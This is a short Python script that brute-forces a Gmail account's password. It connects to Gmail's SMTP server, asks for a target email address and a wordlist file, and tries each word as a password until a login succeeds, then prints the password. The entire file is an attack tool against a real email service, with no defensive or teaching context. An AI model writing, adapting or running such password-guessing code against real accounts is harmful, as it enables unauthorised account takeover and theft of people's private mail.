import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter email : ")
passF = raw_input("Enter wordlist :")
passF = open(passF, 'r')

for password in passF:

    try:
        smtpserver.login(user, password)
        print("password : {}".format(password))
        break
    
    except smtplib.SMTPAuthenticationError:
        print("failed")

